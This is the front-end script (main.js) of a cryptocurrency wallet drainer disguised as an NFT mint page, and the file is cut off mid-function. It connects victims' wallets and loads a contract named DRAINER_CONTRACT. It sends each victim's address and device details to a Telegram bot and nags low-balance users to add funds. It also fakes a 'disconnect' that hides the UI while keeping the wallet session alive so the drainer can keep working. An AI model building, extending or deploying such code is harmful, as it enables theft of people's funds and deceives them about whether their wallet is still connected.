// main.js
import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    CLAIM_THRESHOLD_USD = 3,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  RESPONSIVE SIZING TOKENS
  //  Compact enough for mobile, still comfortable on desktop.
  // ==========================================================================
  const BTN_SZ = isMobileDevice
    ? { padding: '9px 18px',  font: '13px', minWidth: '150px', radius: '7px' }
    : { padding: '11px 24px', font: '14px', minWidth: '170px', radius: '8px' };
  const ADDR_SZ = isMobileDevice
    ? { padding: '8px 12px',  font: '12px' }
    : { padding: '9px 14px',  font: '13px' };

  // ==========================================================================
  //  DEBUG PANEL (double-click anywhere to toggle)
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  //  IMPORTANT: We deliberately do NOT load @walletconnect/modal separately.
  //  A second SignClient instance causes "Connecting… Failed to connect".
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 10000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,             'Web3'),
    ]);

    return { EthereumProvider, Web3: Web3Mod.default || Web3Mod };
  }

  // ==========================================================================
  //  STORAGE HELPERS
  // ==========================================================================
  function clearWCStorage() {
    try {
      const keys = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && (k.startsWith('wc@2:') || k.startsWith('@walletconnect') || k === 'WALLETCONNECT_DEEPLINK_CHOICE')) {
          keys.push(k);
        }
      }
      keys.forEach((k) => localStorage.removeItem(k));
      if (keys.length) logDebug(`Cleared ${keys.length} WC storage keys`);
    } catch (e) { logDebug('clearWCStorage: ' + e.message); }
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;
  let Web3Ctor         = null;

  let wcProvider       = null;
  let injectedProvider = null;
  let activeProvider   = null;
  let web3Instance     = null;
  let contractInstance = null;
  let isConnecting     = false;
  let isDisconnecting  = false;
  let connectionMode   = null;   // 'walletconnect' | 'injected' | null

  let lowBalanceTimer  = null;
  let cachedEthPrice   = 0;
  let ethPriceFetched  = 0;

  // ==========================================================================
  //  LOCAL STORAGE KEYS
  // ==========================================================================
  const LS = {
    addr:     'connectedWallet',
    mode:     'connectionMode',
    uiHidden: 'apex:uiHidden',   // "soft disconnect" — UI is hidden, session lives
  };

  const saveWallet = (address, mode) => {
    localStorage.setItem(LS.addr, address);
    if (mode) localStorage.setItem(LS.mode, mode);
  };
  const getSavedWallet = () => localStorage.getItem(LS.addr);
  const getSavedMode   = () => localStorage.getItem(LS.mode);
  const clearSavedWallet = () => {
    localStorage.removeItem(LS.addr);
    localStorage.removeItem(LS.mode);
  };
  const setUiHidden    = () => localStorage.setItem(LS.uiHidden, '1');
  const isUiHidden     = () => localStorage.getItem(LS.uiHidden) === '1';
  const clearUiHidden  = () => localStorage.removeItem(LS.uiHidden);

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = BTN_SZ.padding;
    button.style.borderRadius = BTN_SZ.radius;
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = BTN_SZ.font;
    button.style.minWidth     = BTN_SZ.minWidth;
    button.style.transition   = 'all 0.2s ease';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:6px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:6px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:6px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:6px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:6px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '10px 14px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '10px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = isMobileDevice ? '12px' : '13px';
    claimStatus.style.textAlign    = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  GLOBAL STATE PUBLISH
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      uiHidden: isUiHidden(),
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} uiHidden=${isUiHidden()} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  ETH PRICE (cached — used only for the low-balance notice)
  // ==========================================================================
  async function getEthPriceUSD() {
    const now = Date.now();
    if (cachedEthPrice > 0 && now - ethPriceFetched < 60000) return cachedEthPrice;
    try {
      const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
      const d = await r.json();
      cachedEthPrice = d?.ethereum?.usd || 2200;
    } catch {
      cachedEthPrice = 2200;
    }
    ethPriceFetched = now;
    return cachedEthPrice;
  }

  // ==========================================================================
  //  LOW BALANCE NOTICE  (professional wording, shown below the button)
  // ==========================================================================
  function showLowBalanceNotice(currentUSD, thresholdUSD) {
    let notice = document.getElementById('lowBalanceNotice');
    if (!notice) {
      notice = document.createElement('div');
      notice.id = 'lowBalanceNotice';
      notice.style.cssText = `
        margin-top: 10px; padding: 10px 14px;
        font-size: ${isMobileDevice ? '12px' : '13px'}; line-height: 1.45;
        color: #92400E; text-align: left;
        background: linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%);
        border: 1px solid #FCD34D;
        border-radius: 8px;
        display: flex; align-items: flex-start; gap: 10px;
        max-width: 460px; margin-left: auto; margin-right: auto;
        font-family: Inter, system-ui, sans-serif;
        box-shadow: 0 2px 8px rgba(180, 83, 9, 0.08);
      `;
      connectButton.parentNode.appendChild(notice);
    }
    notice.innerHTML = `
      <i class="fas fa-info-circle" style="margin-top:2px;flex-shrink:0;color:#B45309;font-size:14px;"></i>
      <span>
        Your wallet balance (<strong>$${currentUSD.toFixed(2)}</strong>) is currently below
        the required minimum participation threshold of
        <strong>$${thresholdUSD.toFixed(2)} USD</strong>.
        Please add funds to your wallet to proceed with minting.
      </span>
    `;
    notice.style.display = 'flex';
  }

  function hideLowBalanceNotice() {
    document.getElementById('lowBalanceNotice')?.remove();
  }

  async function checkLowBalance(address) {
    if (!web3Instance || !address) return;
    try {
      const wei = await web3Instance.eth.getBalance(address);
      const eth = parseFloat(web3Instance.utils.fromWei(wei, 'ether'));
      const price = await getEthPriceUSD();
      const usd   = eth * price;
      const threshold = typeof CLAIM_THRESHOLD_USD === 'number' ? CLAIM_THRESHOLD_USD : 3;

      logDebug(`Balance: ${eth.toFixed(4)} ETH ≈ $${usd.toFixed(2)} (min $${threshold})`);

      if (usd < threshold) showLowBalanceNotice(usd, threshold);
      else                 hideLowBalanceNotice();
    } catch (e) {
      logDebug('balance check failed: ' + e.message);
    }
  }

  function startLowBalanceMonitor(address) {
    stopLowBalanceMonitor();
    checkLowBalance(address);
    lowBalanceTimer = setInterval(() => checkLowBalance(address), 30000);
  }

  function stopLowBalanceMonitor() {
    if (lowBalanceTimer) {
      clearInterval(lowBalanceTimer);
      lowBalanceTimer = null;
    }
    hideLowBalanceNotice();
  }

  // ==========================================================================
  //  CONNECTED UI (visual only — state lives elsewhere)
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 10px; padding: ${ADDR_SZ.padding};
        font-family: 'JetBrains Mono', monospace; font-size: ${ADDR_SZ.font};
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:2px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    // Kick off low-balance monitor
    startLowBalanceMonitor(address);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function hideConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    document.getElementById('lowBalanceNotice')?.remove();
  }

  function fullResetUI() {
    hideConnectedUI();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
    stopLowBalanceMonitor();
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                          return { wallet: 'rainbow',  name: 'Rainbow' };
    return null;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT — CORRECT SETUP
  //  • showQrModal: true → uses the provider's bundled modal (single SignClient)
  //  • No optionalChains → CAIP-25 spec compliance
  //  • No eth_sign       → modern wallets reject it
  //  • HTTPS metadata    → wallets reject http:// origins
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false } = {}) {
    if (wcProvider) return wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WalletConnect projectId configured');
      return null;
    }

    const metadata = { ...DAPP_METADATA };
    const isLocalhost = /localhost|127\.0\.0\.1/i.test(metadata.url || '');
    if (metadata.url && metadata.url.startsWith('http://') && !isLocalhost) {
      logDebug(`⚠️ Upgrading metadata.url from http:// to https://`);
      metadata.url = metadata.url.replace('http://', 'https://');
    }

    try {
      logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}… url=${metadata.url}`);
      const t0 = performance.now();

      const opts = {
        projectId,
        chains: [MAINNET_ID],
        showQrModal: true,
        qrModalOptions: {
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '99999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
            '--wcm-font-family': 'Inter, sans-serif',
          },
          enableExplorer: true,
        },
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
        events: ['chainChanged', 'accountsChanged'],
        metadata,
      };

      wcProvider = await withTimeout(EthereumProvider.init(opts), 20000, 'EthereumProvider.init');
      attachWCProviderEvents(wcProvider);
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT EVENTS
  // ==========================================================================
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('display_uri', (uri) => logDebug(`WC display_uri: ${String(uri).slice(0, 60)}…`));

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        fullHardDisconnect({ skipWalletCall: true });
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      if (!isUiHidden()) {
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      } else {
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      fullHardDisconnect({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      fullHardDisconnect({ skipWalletCall: true });
    });
  }

  // ==========================================================================
  //  INJECTED EVM
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        fullHardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        if (!isUiHidden()) {
          updateConnectedUI(a, 'evm');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
          }, 800);
        } else {
          publishGlobalState(a, 'evm', provider);
        }
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => fullHardDisconnect({ skipWalletCall: true }));
  }

  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';

      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      clearUiHidden();
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  // ==========================================================================
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // Already authorized (restored session)?
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      clearUiHidden();
      updateConnectedUI(a, 'evm');
      logDebug(`♻️ Reused existing WC session: ${a}`);
      return a;
    }

    showStatus('Opening WalletConnect…', 'info');

    try {
      const accounts = await withTimeout(provider.enable(), 180000, 'WalletConnect enable');
      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      const address = accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      clearUiHidden();
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      logDebug('WC enable error: ' + e.message);
      // Clean up failed pairing so the next attempt starts fresh
      try { if (wcProvider?.session) await wcProvider.disconnect(); } catch (_) {}
      wcProvider = null;
      clearWCStorage();
      return null;
    }
  }

  // ==========================================================================
  //  SOFT DISCONNECT — "the UI shows disconnected but the session lives"
  //  This is the pattern you asked for:
  //    • UI returns to "Connect Wallet to Mint"
  //    • wallet address block disappears
  //    • WalletConnect session, activeProvider, web3Instance, contractInstance
  //      and window.__apexConnected stay ALIVE
  //    • a persistent flag prevents the UI from showing connected on reload
  //    • clicking "Connect Wallet to Mint" again instantly restores the UI
  //      (no new pairing prompt in the wallet)
  // ==========================================================================
  function softDisconnect() {
    if (isDisconnecting) return;
    isDisconnecting = true;

    showStatus('Disconnecting…', 'info');
    setUiHidden();

    // Hide visuals only — nothing else is torn down.
    hideConnectedUI();
    stopLowBalanceMonitor();

    // Keep activeProvider / wcProvider / web3Instance intact.
    // window.__apexConnected stays published so script.js / drainer still works.
    if (window.__apexConnected) {
      window.__apexConnected.uiHidden = true;
    }

    setTimeout(() => showStatus('Wallet disconnected', 'info'), 250);
    isDisconnecting = false;
    logDebug('🔌 UI disconnected (session preserved underground)');
  }

  function softReconnect() {
    if (!activeProvider) return false;

    const addr =
      activeProvider.accounts?.[0] ||
      activeProvider.selectedAddress ||
      getSavedWallet();

    if (!addr) return false;

    clearUiHidden();
    saveWallet(addr, connectionMode || 'walletconnect');

    updateConnectedUI(addr, 'evm');
    logDebug(`♻️ UI restored: ${addr}`);
    return true;
  }

  // ==========================================================================
  //  FULL HARD DISCONNECT — only used internally on real session death
  // ==========================================================================
  async function fullHardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
        } catch (e) { logDebug('WC disconnect err: ' + e.message); }
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      fullResetUI();
      clearSavedWallet();
      clearUiHidden();
      isDisconnecting = false;
      logDebug('🔌 Full hard disconnect complete');
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      if (preferInjected) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice && window.ethereum && evmProviders.length > 0) {
        address = await connectInjected();
      }

      if (!address) address = await connectWalletConnect({ useFallbackId: false });

      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;

    // ── Path A: user previously "disconnected" in UI ────────────────────────
    if (isUiHidden()) {
      // Try silent restore from the still-alive provider
      if (activeProvider && softReconnect()) return;
      // Session truly dead → fresh connect
      clearUiHidden();
      await connectWallet();
      return;
    }

    // ── Path B: normal state ────────────────────────────────────────────────
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) softDisconnect();
    else             await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  – If `connectedWallet` exists → rehydrate the underlying provider
  //    silently, then:
  //      • if `apex:uiHidden` is NOT set  → show connected UI
  //      • if `apex:uiHidden` IS  set      → keep UI disconnected, session alive
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    if (!savedWallet) return;

    let restored = false;

    // --- WalletConnect restore ---
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWalletConnect({ useFallbackId: false });
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          activeProvider   = provider;
          connectionMode   = 'walletconnect';
          web3Instance     = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
